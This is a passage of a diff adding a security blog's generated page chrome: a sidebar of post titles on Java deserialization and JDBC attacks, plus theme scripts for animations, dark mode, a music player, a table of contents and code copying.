+              <a class="post-title" href="/2025/08/26/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">Jackson反序列化</a>
+            </div>
+          </div>
+        
+          <div class="aside-list-item">
+            
+            
+            
+
+            <div class="post-img-box">
+              <a href="/2025/08/19/JDK7u21/" class="post-img " style="background-size: cover; 
+                background-position: center center;">
+                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://pic3.zhimg.com/80/v2-7cfc909ebe8d83683909846edd6b5232_1440w.webp" class="lazyload placeholder" data-srcset="https://pic3.zhimg.com/80/v2-7cfc909ebe8d83683909846edd6b5232_1440w.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+              </a>
+            </div>
+            <div class="post-date-title">
+              <div>
+                
+                  <span class="post-date">08-19</span>
+                
+              </div>
+              <a class="post-title" href="/2025/08/19/JDK7u21/">JDK7u21</a>
+            </div>
+          </div>
+        
+          <div class="aside-list-item">
+            
+            
+            
+
+            <div class="post-img-box">
+              <a href="/2025/08/15/H2-JDBC-Attack/" class="post-img " style="background-size: cover; 
+                background-position: center center;">
+                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://pic2.zhimg.com/80/v2-29e78b52051ce542adf6d786d61fbd19_1440w.webp" class="lazyload placeholder" data-srcset="https://pic2.zhimg.com/80/v2-29e78b52051ce542adf6d786d61fbd19_1440w.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+              </a>
+            </div>
+            <div class="post-date-title">
+              <div>
+                
+                  <span class="post-date">08-15</span>
+                
+              </div>
+              <a class="post-title" href="/2025/08/15/H2-JDBC-Attack/">H2-JDBC-Attack</a>
+            </div>
+          </div>
+        
+          <div class="aside-list-item">
+            
+            
+            
+
+            <div class="post-img-box">
+              <a href="/2025/08/14/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" class="post-img " style="background-size: cover; 
+                background-position: center center;">
+                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://pica.zhimg.com/80/v2-573ac3e25de03fad9c32add5a05e5cfc_1440w.webp" class="lazyload placeholder" data-srcset="https://pica.zhimg.com/80/v2-573ac3e25de03fad9c32add5a05e5cfc_1440w.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+              </a>
+            </div>
+            <div class="post-date-title">
+              <div>
+                
+                  <span class="post-date">08-14</span>
+                
+              </div>
+              <a class="post-title" href="/2025/08/14/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/">Redis未授权</a>
+            </div>
+          </div>
+        
+          <div class="aside-list-item">
+            
+            
+            
+
+            <div class="post-img-box">
+              <a href="/2025/08/07/PostgreSQL-JDBC-Attack/" class="post-img " style="background-size: cover; 
+                background-position: center center;">
+                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="https://pica.zhimg.com/80/v2-61f99f8dcf899f54cad2a1aa28b21e44_1440w.webp" class="lazyload placeholder" data-srcset="https://pica.zhimg.com/80/v2-61f99f8dcf899f54cad2a1aa28b21e44_1440w.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+              </a>
+            </div>
+            <div class="post-date-title">
+              <div>
+                
+                  <span class="post-date">08-07</span>
+                
+              </div>
+              <a class="post-title" href="/2025/08/07/PostgreSQL-JDBC-Attack/">PostgreSQL-JDBC-Attack</a>
+            </div>
+          </div>
+        
+      </div>
+    </div>
+  </section>
+
+    
+  </div>
+</aside>
+
+  <!-- 图片放大 Wrap images with fancybox support -->
+  <script defer src="/js/wrapImage.js"></script>
+</div>
+
+<!-- 文章详情页背景图 -->
+<div id="appBgSwiper" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -2;"
+	:style="{'background-color': bgColor ? bgColor : 'transparent'}">
+	<transition-group tag="ul" :name="names">
+		<li v-for='(image,index) in img' :key='index' v-show="index === mark" class="bg-swiper-box">
+			<img :src="image" class="bg-swiper-img no-lazy">
+		</li>
+	</transition-group>
+</div>
+<script>
+	var vm = new Vue({
+		el: '#appBgSwiper',
+		data: {
+			names: '' || 'fade' || 'fade', // translate-fade fade
+			mark: 0,
+			img: [],
+			bgColor: '',
+			time: null
+		},
+		methods: {   //添加方法
+			change(i, m) {
+				if (i > m) {
+					// this.names = 'fade';
+				} else if (i < m) {
+					// this.names = 'fade';
+				} else {
+					return;
+				}
+				this.mark = i;
+			},
+			prev() {
+				// this.names = 'fade';
+				this.mark--;
+				if (this.mark === -1) {
+					this.mark = 3;
+					return
+				}
+			},
+			next() {
+				// this.names = 'fade';
+				this.mark++;
+				if (this.mark === this.img.length) {
+					this.mark = 0;
+					return
+				}
+			},
+			autoPlay() {
+				// this.names = 'fade';
+				this.mark++;
+				if (this.mark === this.img.length) {
+					this.mark = 0;
+					return
+				}
+			},
+			play() {
+				let bgImgDelay = '' || '180000'
+				let delay = parseInt(bgImgDelay) || 180000;
+				this.time = setInterval(this.autoPlay, delay);
+			},
+			enter() {
+				clearInterval(this.time);
+			},
+			leave() {
+				this.play();
+			}
+		},
+		created() {
+			this.play()
+		},
+		beforeDestroy() {
+			clearInterval(this.time);
+		},
+		mounted() {
+			let prop = '' || '';
+			let isImg = prop.includes('.bmp') || prop.includes('.jpg') || prop.includes('.png') || prop.includes('.tif') || prop.includes('.gif') || prop.includes('.pcx') || prop.includes('.tga') || prop.includes('.exif') || prop.includes('.fpx') || prop.includes('.psd') || prop.includes('.cdr') || prop.includes('.pcd') || prop.includes('.dxf') || prop.includes('.ufo') || prop.includes('.eps') || prop.includes('.ai') || prop.includes('.raw') || prop.includes('.WMF') || prop.includes('.webp') || prop.includes('.jpeg') || prop.includes('http://') || prop.includes('https://')
+			if (isImg) {
+				let img = prop.split(',');
+				let configRoot = '/'
+				let arrImg = [];
+				img.forEach(el => {
+					var Expression = /http(s)?:\/\/([\w-]+\.)+[\w-]+(\/[\w- .\/?%&=]*)?/;
+					var objExp = new RegExp(Expression);
+
+					if (objExp.test(el)) {
+						// http or https
+						arrImg.push(el);
+					} else {
+						// 非http or https开头
+						// 本地文件
+						let firstStr = el.charAt(0);
+						if (firstStr == '/') {
+							el = el.substr(1); // 删除第一个字符 '/',因为 configRoot最后一个字符为 /
+						}
+						el = configRoot + el;
+						arrImg.push(el);
+					}
+				})
+				this.img = arrImg;
+			} else {
+				this.bgColor = prop;
+			}
+		}
+	})
+</script>
+
+<style>
+	.bg-swiper-box {
+		position: absolute;
+		display: block;
+		width: 100%;
+		height: 100%;
+	}
+
+	.bg-swiper-img {
+		object-fit: cover;
+		width: 100%;
+		height: 100%;
+	}
+</style>
+
+
+
+
+  <script>
+  function loadMermaid() {
+    if (document.getElementsByClassName('mermaid').length) {
+      if (window.mermaidJsLoad) mermaid.init()
+      else {
+        loadScript('https://unpkg.com/mermaid/dist/mermaid.min.js').then(() => {
+          window.mermaidJsLoad = true
+          mermaid.initialize({
+            theme: 'default',
+          })
+          if ('true') {
+            mermaid.init();
+          }
+        })
+      }
+    }
+  };
+  document.addEventListener("DOMContentLoaded", function () {
+    loadMermaid();
+  })
+
+  document.addEventListener('pjax:complete', function () {
+    loadMermaid();
+  })
+  
+</script>
+
+
+      </main>
+    </div>
+
+    <!-- 页脚 -->
+    
+  
+  
+    <!-- 底部鱼儿跳动效果，依赖于jquery-->
+<div id="j-fish-skip" style=" position: relative;height: 153px;width: auto;"></div>
+<script defer>
+  var RENDERER = {
+    POINT_INTERVAL: 5,
+    FISH_COUNT: 3,
+    MAX_INTERVAL_COUNT: 50,
+    INIT_HEIGHT_RATE: .5,
+    THRESHOLD: 50,
+    FISH_COLOR: '',
+    init: function () {
+      this.setFishColor(); this.setParameters(), this.reconstructMethods(), this.setup(), this.bindEvent(), this.render()
+    },
+    setFishColor: function () {
+      let isDark = JSON.parse(localStorage.getItem('dark')) || JSON.parse('false');
+      if (isDark) {
+        this.FISH_COLOR = '#222'; // 暗黑色，有时间把这整成一个变量
+      } else {
+        this.FISH_COLOR = '' || 'rgba(66, 185, 133, 0.8)';
+      }
+    },
+    setParameters: function () {
+      this.$window = $(window), this.$container = $("#j-fish-skip"), this.$canvas = $("<canvas />"), this.context = this.$canvas.appendTo(this.$container).get(0).getContext("2d"), this.points = [], this.fishes = [], this.watchIds = []
+    },
+    createSurfacePoints: function () {
+      var t = Math.round(this.width / this.POINT_INTERVAL);
+      this.pointInterval = this.width / (t - 1), this.points.push(new SURFACE_POINT(this, 0));
+      for (var i = 1; i < t; i++) {
+        var e = new SURFACE_POINT(this, i * this.pointInterval),
+          h = this.points[i - 1];
+        e.setPreviousPoint(h), h.setNextPoint(e), this.points.push(e)
+      }
+    },
+    reconstructMethods: function () {
+      this.watchWindowSize = this.watchWindowSize.bind(this), this.jdugeToStopResize = this.jdugeToStopResize.bind(this), this.startEpicenter = this.startEpicenter.bind(this), this.moveEpicenter = this.moveEpicenter.bind(this), this.reverseVertical = this.reverseVertical.bind(this), this.render = this.render.bind(this)
+    },
+    setup: function () {
+      this.points.length = 0, this.fishes.length = 0, this.watchIds.length = 0, this.intervalCount = this.MAX_INTERVAL_COUNT, this.width = this.$container.width(), this.height = this.$container.height(), this.fishCount = this.FISH_COUNT * this.width / 500 * this.height / 500, this.$canvas.attr({
+        width: this.width,
+        height: this.height
+      }), this.reverse = !1, this.fishes.push(new FISH(this)), this.createSurfacePoints()
+    },
+    watchWindowSize: function () {
+      this.clearTimer(), this.tmpWidth = this.$window.width(), this.tmpHeight = this.$window.height(), this.watchIds.push(setTimeout(this.jdugeToStopResize, this.WATCH_INTERVAL))
+    },
+    clearTimer: function () {
+      for (; this.watchIds.length > 0;) clearTimeout(this.watchIds.pop())
+    },
+    jdugeToStopResize: function () {
+      var t = this.$window.width(),
+        i = this.$window.height(),
+        e = t == this.tmpWidth && i == this.tmpHeight;
+      this.tmpWidth = t, this.tmpHeight = i, e && this.setup()
+    },
+    bindEvent: function () {
+      this.$window.on("resize", this.watchWindowSize), this.$container.on("mouseenter", this.startEpicenter), this.$container.on("mousemove", this.moveEpicenter)
+    },
+    getAxis: function (t) {
+      var i = this.$container.offset();
+      return {
+        x: t.clientX - i.left + this.$window.scrollLeft(),
+        y: t.clientY - i.top + this.$window.scrollTop()
+      }
+    },
+    startEpicenter: function (t) {
+      this.axis = this.getAxis(t)
+    },
+    moveEpicenter: function (t) {
+      var i = this.getAxis(t);
+      this.axis || (this.axis = i), this.generateEpicenter(i.x, i.y, i.y - this.axis.y), this.axis = i
+    },
+    generateEpicenter: function (t, i, e) {
+      if (!(i < this.height / 2 - this.THRESHOLD || i > this.height / 2 + this.THRESHOLD)) {
+        var h = Math.round(t / this.pointInterval);
+        h < 0 || h >= this.points.length || this.points[h].interfere(i, e)
+      }
+    },
+    reverseVertical: function () {
+      this.reverse = !this.reverse;
+      for (var t = 0, i = this.fishes.length; t < i; t++) this.fishes[t].reverseVertical()
+    },
+    controlStatus: function () {
+      for (var t = 0, i = this.points.length; t < i; t++) this.points[t].updateSelf();
+      for (t = 0, i = this.points.length; t < i; t++) this.points[t].updateNeighbors();
+      this.fishes.length < this.fishCount && 0 == --this.intervalCount && (this.intervalCount = this.MAX_INTERVAL_COUNT, this.fishes.push(new FISH(this)))
+    },
+    render: function () {
+      requestAnimationFrame(this.render), this.controlStatus(), this.context.clearRect(0, 0, this.width, this.height), this.context.fillStyle = this.FISH_COLOR;
+      for (var t = 0, i = this.fishes.length; t < i; t++) this.fishes[t].render(this.context);
+      this.context.save(), this.context.globalCompositeOperation = "xor", this.context.beginPath(), this.context.moveTo(0, this.reverse ? 0 : this.height);
+      for (t = 0, i = this.points.length; t < i; t++) this.points[t].render(this.context);
+      this.context.lineTo(this.width, this.reverse ? 0 : this.height), this.context.closePath(), this.context.fill(), this.context.restore()
+    }
+  },
+  SURFACE_POINT = function (t, i) {
+    this.renderer = t, this.x = i, this.init()
+  };
+  SURFACE_POINT.prototype = {
+    SPRING_CONSTANT: .03,
+    SPRING_FRICTION: .9,
+    WAVE_SPREAD: .3,
+    ACCELARATION_RATE: .01,
+    init: function () {
+      this.initHeight = this.renderer.height * this.renderer.INIT_HEIGHT_RATE, this.height = this.initHeight, this.fy = 0, this.force = {
+        previous: 0,
+        next: 0
+      }
+    },
+    setPreviousPoint: function (t) {
+      this.previous = t
+    },
+    setNextPoint: function (t) {
+      this.next = t
+    },
+    interfere: function (t, i) {
+      this.fy = this.renderer.height * this.ACCELARATION_RATE * (this.renderer.height - this.height - t >= 0 ? -1 : 1) * Math.abs(i)
+    },
+    updateSelf: function () {
+      this.fy += this.SPRING_CONSTANT * (this.initHeight - this.height), this.fy *= this.SPRING_FRICTION, this.height += this.fy
+    },
+    updateNeighbors: function () {
+      this.previous && (this.force.previous = this.WAVE_SPREAD * (this.height - this.previous.height)), this.next && (this.force.next = this.WAVE_SPREAD * (this.height - this.next.height))
+    },
+    render: function (t) {
+      this.previous && (this.previous.height += this.force.previous, this.previous.fy += this.force.previous), this.next && (this.next.height += this.force.next, this.next.fy += this.force.next), t.lineTo(this.x, this.renderer.height - this.height)
+    }
+  };
+  var FISH = function (t) {
+    this.renderer = t, this.init()
+  };
+  FISH.prototype = {
+    GRAVITY: .4,
+    init: function () {
+      this.direction = Math.random() < .5, this.x = this.direction ? this.renderer.width + this.renderer.THRESHOLD : -this.renderer.THRESHOLD, this.previousY = this.y, this.vx = this.getRandomValue(4, 10) * (this.direction ? -1 : 1), this.renderer.reverse ? (this.y = this.getRandomValue(1 * this.renderer.height / 10, 4 * this.renderer.height / 10), this.vy = this.getRandomValue(2, 5), this.ay = this.getRandomValue(.05, .2)) : (this.y = this.getRandomValue(6 * this.renderer.height / 10, 9 * this.renderer.height / 10), this.vy = this.getRandomValue(-5, -2), this.ay = this.getRandomValue(-.2, -.05)), this.isOut = !1, this.theta = 0, this.phi = 0
+    },
+    getRandomValue: function (t, i) {
+      return t + (i - t) * Math.random()
+    },
+    reverseVertical: function () {
+      this.isOut = !this.isOut, this.ay *= -1
+    },
+    controlStatus: function (t) {
+      this.previousY = this.y, this.x += this.vx, this.y += this.vy, this.vy += this.ay, this.renderer.reverse ? this.y > this.renderer.height * this.renderer.INIT_HEIGHT_RATE ? (this.vy -= this.GRAVITY, this.isOut = !0) : (this.isOut && (this.ay = this.getRandomValue(.05, .2)), this.isOut = !1) : this.y < this.renderer.height * this.renderer.INIT_HEIGHT_RATE ? (this.vy += this.GRAVITY, this.isOut = !0) : (this.isOut && (this.ay = this.getRandomValue(-.2, -.05)), this.isOut = !1), this.isOut || (this.theta += Math.PI / 20, this.theta %= 2 * Math.PI, this.phi += Math.PI / 30, this.phi %= 2 * Math.PI), this.renderer.generateEpicenter(this.x + (this.direction ? -1 : 1) * this.renderer.THRESHOLD, this.y, this.y - this.previousY), (this.vx > 0 && this.x > this.renderer.width + this.renderer.THRESHOLD || this.vx < 0 && this.x < -this.renderer.THRESHOLD) && this.init()
+    },
+    render: function (t) {
+      t.save(), t.translate(this.x, this.y), t.rotate(Math.PI + Math.atan2(this.vy, this.vx)), t.scale(1, this.direction ? 1 : -1), t.beginPath(), t.moveTo(-30, 0), t.bezierCurveTo(-20, 15, 15, 10, 40, 0), t.bezierCurveTo(15, -10, -20, -15, -30, 0), t.fill(), t.save(), t.translate(40, 0), t.scale(.9 + .2 * Math.sin(this.theta), 1), t.beginPath(), t.moveTo(0, 0), t.quadraticCurveTo(5, 10, 20, 8), t.quadraticCurveTo(12, 5, 10, 0), t.quadraticCurveTo(12, -5, 20, -8), t.quadraticCurveTo(5, -10, 0, 0), t.fill(), t.restore(), t.save(), t.translate(-3, 0), t.rotate((Math.PI / 3 + Math.PI / 10 * Math.sin(this.phi)) * (this.renderer.reverse ? -1 : 1)), t.beginPath(), this.renderer.reverse ? (t.moveTo(5, 0), t.bezierCurveTo(10, 10, 10, 30, 0, 40), t.bezierCurveTo(-12, 25, -8, 10, 0, 0)) : (t.moveTo(-5, 0), t.bezierCurveTo(-10, -10, -10, -30, 0, -40), t.bezierCurveTo(12, -25, 8, -10, 0, 0)), t.closePath(), t.fill(), t.restore(), t.restore(), this.controlStatus(t)
+    }
+  }, $(function () {
+    RENDERER.init()
+    $('.dark').click(function () {
+      setTimeout(() => {
+        RENDERER.setFishColor();
+        RENDERER.context.fill();
+      });
+    })
+  });
+</script>
+  
+  <div class="footer bg-color">
+    <div class="footer-main">
+      
+        
+          <div class="link">
+            
+          </div>
+        
+      
+        
+          <div class="footer-custom">
+            
+          </div>
+        
+      
+    </div>
+  </div>
+
+
+
+    <!-- 渲染暗黑按钮 -->
+    
+      <div class="dark" onclick="toggleDarkMode()">
+  <div class="dark-content">
+    <i class="fas" id="darkIcon" aria-hidden="true"></i>
+  </div>
+</div>
+
+<script defer>
+  $(function() {
+    // 初始化暗黑模式状态
+    let isDark = JSON.parse(localStorage.getItem('dark')) || JSON.parse('false');
+    updateDarkModeIcon(isDark);
+  });
+
+  function toggleDarkMode() {
+    const isDark = $(document.body).hasClass('darkModel');
+    $(document.body).toggleClass('darkModel');
+    localStorage.setItem('dark', !isDark);
+    updateDarkModeIcon(!isDark);
+  }
+
+  function updateDarkModeIcon(isDark) {
+    const iconElement = document.getElementById('darkIcon');
+    if (isDark) {
+      iconElement.classList.remove('fa-moon');
+      iconElement.classList.add('fa-lightbulb');
+    } else {
+      iconElement.classList.remove('fa-lightbulb');
+      iconElement.classList.add('fa-moon');
+    }
+  }
+</script>
+
+    
+    <!-- 渲染回到顶部按钮 -->
+    
+      <div class="goTop top-btn-color" pointer>
+  <i class="fas fa-arrow-up" aria-hidden="true"></i>
+</div>
+<script defer src="/js/goTop.js"></script>
+
+    
+    <!-- 渲染左下角音乐播放器 -->
+    
+      <link rel="stylesheet" href="/js/aplayer/APlayer@1.10.1.min.css">
+<style>
+.aplayer .aplayer-lrc p {
+  
+  font-size: 12px;
+  font-weight: 700;
+  line-height: 16px !important;
+}
+
+.aplayer .aplayer-lrc p.aplayer-lrc-current {
+  
+  font-size: 15px;
+  color: #42b983;
+}
+
+
+.aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+  left: -66px !important;
+}
+
+.aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+  left: 0px !important;
+}
+
+
+</style>
+<meting-js  
+  class=""
+  server="tencent"
+  type="playlist"
+  id="8062553743"
+  fixed='true'
+  autoplay='false'
+  theme='#42b983'
+  loop='all'
+  order='random'
+  preload='auto'
+  volume='0.7'
+  list-folded='true'
+>
+</meting-js>
+
+<!-- <style>
+  #aplayer {
+    position: fixed;
+    left: 0;
+    bottom: 300px;
+  }
+</style> -->
+<script defer src="https://unpkg.com/aplayer@1.10.1/dist/APlayer.min.js"></script>
+<script defer src="https://unpkg.com/meting@2/dist/Meting.min.js"></script>
+    
+
+    <!-- 图片放大 -->
+    
+      <script src="https://unpkg.com/@fancyapps/ui@5.0/dist/fancybox/fancybox.umd.js"></script>
+    
+
+    <!-- 百度解析 -->
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script async>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <!-- 背景彩带 -->
+    
+      <script async type="text/javascript" size="100" alpha='0.4' zIndex="-1" src="/js/ribbon.min.js"></script>
+    
+
+    <script src="/js/utils/index.js"></script>
+    <script src="/js/app.js"></script>
+    
+    <!-- 文章目录所需js -->
+<!-- <link href="/js/tocbot/tocbot.css" rel="stylesheet">
+<script src="/js/tocbot/tocbot.min.js"></script> -->
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.18.2/tocbot.min.js"></script>
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.18.2/tocbot.css">
+
+<script>
+  var headerEl = 'h2, h3, h4',  //headers 
+    content = '.post-detail',//文章容器
+    idArr = {};  //标题数组以确定是否增加索引id
+  //add #id
+  var option = {
+    // Where to render the table of contents.
+    tocSelector: '.toc',
+    // Where to grab the headings to build the table of contents.
+    contentSelector: content,
+    // Which headings to grab inside of the contentSelector element.
+    headingSelector: headerEl,
+    scrollSmooth: true,
+    scrollSmoothOffset: -70,
+    // headingsOffset: -($(window).height() * 0.4 - 45),
+    headingsOffset: -($(window).height() * 0.4 - 70),
+    // positionFixedSelector: '.toc-main',
+    // positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto',
+    activeLinkClass: 'is-active-link',
+    orderedList: true,
+    collapseDepth: 20,
+    // onClick: function (e) {},
+  }
+  if ($('.toc').length > 0) {
+
+    $(content).children(headerEl).each(function () {
+      //去除空格以及多余标点
+      var headerId = $(this).text().replace(/[\s|\~|`|\!|\@|\#|\$|\%|\^|\&|\*|\(|\)|\_|\+|\=|\||\|\[|\]|\{|\}|\;|\:|\"|\'|\,|\<|\.|\>|\/|\?|\：|\，|\。]/g, '');
+
+      headerId = headerId.toLowerCase();
+      if (idArr[headerId]) {
+        //id已经存在
+        $(this).attr('id', headerId + '-' + idArr[headerId]);
+        idArr[headerId]++;
+      }
+      else {
+        //id未存在
+        idArr[headerId] = 1;
+        $(this).attr('id', headerId);
+      }
+    });
+
+    document.addEventListener("DOMContentLoaded", function () {
+      tocbot.init(option);
+      mobileTocClick();
+    });
+
+  }
+
+  window.tocScrollFn = function () {
+    return bamboo.throttle(function () {
+      findHeadPosition();
+    }, 100)()
+  }
+  window.addEventListener('scroll', tocScrollFn);
+
+  const findHeadPosition = function (top) {
+    if ($('.toc-list').length <= 0) {
+      return false;
+    }
+    setTimeout(() => {  // or DOMContentLoaded 
+      autoScrollToc();
+    }, 0);
+  }
+
+  const autoScrollToc = function () {
+    const $activeItem = document.querySelector('.is-active-link');
+    const $cardToc = document.querySelector('.toc-content');
+    const activePosition = $activeItem.getBoundingClientRect().top
+    const sidebarScrollTop = $cardToc.scrollTop
+    if (activePosition > (document.documentElement.clientHeight - 100)) {
+      $cardToc.scrollTop = sidebarScrollTop + 150
+    }
+    if (activePosition < 150) {
+      $cardToc.scrollTop = sidebarScrollTop - 150
+    }
+  }
+
+  document.addEventListener('pjax:send', function () {
+    if ($('.toc').length) {
+      tocbot.destroy();
+    }
+  });
+
+  document.addEventListener('pjax:complete', function () {
+    if ($('.toc').length) {
+      tocbot.init(option);
+      mobileTocClick();
+    }
+  });
+  
+  // 手机端toc按钮点击出现目录
+  const mobileTocClick = function () {
+    const $cardTocLayout = document.getElementsByClassName('side_toc')[0];
+    const $cardToc = $cardTocLayout.getElementsByClassName('toc-content')[0];
+    let right = '45px';
+    if (window.innerWidth >= 551 && window.innerWidth <= 992) {
+      right = '100px'
+    }
+    const mobileToc = {
+      open: () => {
+        $cardTocLayout.style.cssText = 'animation: toc-open .3s; opacity: 1; right: ' + right
+      },
+
+      close: () => {
+        $cardTocLayout.style.animation = 'toc-close .2s'
+        setTimeout(() => {
+          $cardTocLayout.style.cssText = "opacity:''; animation: ''; right: ''"
+        }, 100)
+      }
+    }
+    document.getElementById('toc-mobile-btn').addEventListener('click', () => {
+      if (window.getComputedStyle($cardTocLayout).getPropertyValue('opacity') === '0') mobileToc.open()
+      else mobileToc.close()
+    })
+
+    $cardToc.addEventListener('click', (e) => {
+      if (window.innerWidth < 992) { // 小于992px的时候
+        mobileToc.close()
+      }
+    })
+  }
+</script>
+
+<style>
+  /* .is-position-fixed {
+    position: sticky !important;
+    top: 74px;
+  }
+
+  .toc-main ul {
+    counter-reset: show-list;
+  }
+
+  .toc-main ul li::before {
+    content: counter(item)".";
+    display: block;
+    position: absolute;
+    left: 12px;
+    top: 0;
+  } */
+</style>
+ 
+
+<!-- 设置导航背景 -->
+<script>
+  let setHeaderClass = () => {
+    const nav = $('#navHeader');
+    const navTop = nav.outerHeight();
+    const winTop = $(window).scrollTop();
+    if(winTop > navTop) {
+      nav.addClass('header-bg-color');
+    }
+    else {
+      nav.removeClass('header-bg-color');
+    }
+  };
+
+  let scrollCollect = () => {
+    return bamboo.throttle(function (e) {
+      setHeaderClass();
+    }, 200)()
+  }
+
+  let initHeaderBg = () => {
+    setHeaderClass();
+  }
+
+  setHeaderClass();
+  window.addEventListener('scroll', scrollCollect);
+
+  document.addEventListener('pjax:send', function () {
+    window.removeEventListener('scroll', scrollCollect)
+  })
+  document.addEventListener('pjax:complete', function () {
+    window.addEventListener('scroll', scrollCollect);
+    setHeaderClass();
+  })
+</script> 
+
+<!-- 渲染issues标签里的内容 -->
+<script>
+  function loadIssuesJS() {
+    if ($(".post-detail").find(".issues-api").length == 0) {
+      return;
+    } 
+    loadScript('/js/issues/index.js');
+  };
+  $(function () {
+    loadIssuesJS();
+  });
+  document.addEventListener('pjax:complete', function () {
+    if (typeof IssuesAPI == "undefined") {
+      loadIssuesJS();
+    }
+  })
+</script>
+
+<!-- 渲染远程json加载的图片标签(getPhotoOnline)里的内容 -->
+<script>
+  function loadPhotoOnlineJS() {
+    if ($(".post-detail").find(".getJsonPhoto-api").length == 0) {
+      return;
+    } 
+    loadScript('/js/getPhotoOnline/index.js');
+  };
+  $(function () {
+    loadPhotoOnlineJS();
+  });
+  document.addEventListener('pjax:complete', function () {
+    if (typeof getPhotoJson == "undefined") {
+      loadPhotoOnlineJS();
+    }
+  })
+</script>
+
+<!-- 渲染远程json加载的talk标签(getTalkOnline)里的内容 -->
+<script>
+  function loadTalkOnlineJS() {
+    if ($(".post-detail").find(".getJsonTalk-api").length == 0) {
+      return;
+    } 
+    loadScript('https://cdnjs.cloudflare.com/ajax/libs/waterfall.js/1.0.2/waterfall.min.js'); // 瀑布流插件，https://raphamorim.io/waterfall.js/
+    loadScript('/js/getTalkOnline/index.js');
+  };
+  $(function () {
+    loadTalkOnlineJS();
+  });
+  document.addEventListener('pjax:complete', function () {
+    if (typeof getTalkJson == "undefined") {
+      loadTalkOnlineJS();
+    }
+  })
+</script>
+
+<!-- 渲染远程json加载的site-card标签(getSiteOnline)里的内容 -->
+<script>
+  function loadSiteOnlineJS() {
+    if ($(".post-detail").find(".getJsonSite-api").length == 0) {
+      return;
+    } 
+    loadScript('/js/getSiteOnline/index.js');
+  };
+  $(function () {
+    loadSiteOnlineJS();
+  });
+  document.addEventListener('pjax:complete', function () {
+    if (typeof getSiteJson == "undefined") {
+      loadSiteOnlineJS();
+    }
+  })
+</script>
+
+<!-- 输入框打字特效 -->
+<!-- 输入框打字特效 -->
+
+  <script src="/js/activate-power-mode.js"></script>
+  <script>
+    POWERMODE.colorful = true;  // 打开随机颜色特效
+    POWERMODE.shake = false;    // 关闭输入框抖动
+    document.body.addEventListener('input', POWERMODE);//监听打字事件
+  </script>
+
+
+<!-- markdown代码一键复制功能 -->
+
+  <link rel="stylesheet" href="https://unpkg.com/v-plugs-ayu/lib/ayu.css">
+  <script src="https://unpkg.com/v-plugs-ayu/lib/ayu.umd.min.js"></script>
+  <script src="/js/clipboard/clipboard.min.js"></script>
+  <div id="appCopy">
+  </div>
+  <script data-pjax>
+    var vm = new Vue({
+      el: '#appCopy',
+      data: {
+      },
+      computed: {
+      },
+      mounted() {
+        const that = this;
+        var copy = '复制';
+        /* code */
+        var initCopyCode = function () {
+          var copyHtml = '';
+          copyHtml += '<button class="btn-copy" data-clipboard-snippet="" style="position:absolute;top:0;right:0;z-index:1;">';
+          copyHtml += '<i class="fas fa-copy"></i><span>' + copy + '</span>';
+          copyHtml += '</button>';
+          $(".post-detail pre").not('.gutter pre').wrap("<div class='codeBox' style='position:relative;width:100%;'></div>")
+          $(".post-detail pre").not('.gutter pre').before(copyHtml);
+          new ClipboardJS('.btn-copy', {
+            target: function (trigger) {
+              return trigger.nextElementSibling;
+            }
+          });
+        }
+        initCopyCode();
+        $('.btn-copy').unbind('click').bind('click', function () {
+          doSomething();
+        })
+        $(document).unbind('keypress').bind('keypress', function (e) {
+          if (e.ctrlKey && e.keyCode == 67) {
+            doSomething();
+          }
+        })
+
+        function doSomething() {
+          that.$notify({
+            title: "成功",
+            content: "代码已复制，请遵守相关授权协议。",
+            type: 'success'
+          })
+        }
+      },
+      methods: {
+      },
+      created() { }
+    })
+  </script>
+  
+
+<!-- 图片懒加载 -->
+<script defer src="https://unpkg.com/vanilla-lazyload@17.1.0/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazyload",
+    threshold: 0
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    lazyLoadInstance.update();
+  });
+  document.addEventListener('pjax:complete', function () {
+    lazyLoadInstance.update();
+  });
+</script>
+
+
+<!-- 卡片滚动动画 -->
+   
+
+<!-- 评论所需js -->
+
+  
+        <script type="text/javascript">
+  var utteranceComment = {};
+
+  function check_utterance() {
+    let isDark = JSON.parse(localStorage.getItem('dark')) || JSON.parse('false');
+    if (isDark) {
+      utteranceComment.Theme = 'github-dark';
+    } else {
+      utteranceComment.Theme = 'github-light';
+    }
+
+    return document.getElementById("gitment-container");
+  }
+  comment_el = '#gitment-container';
+  load_utterance = function () {
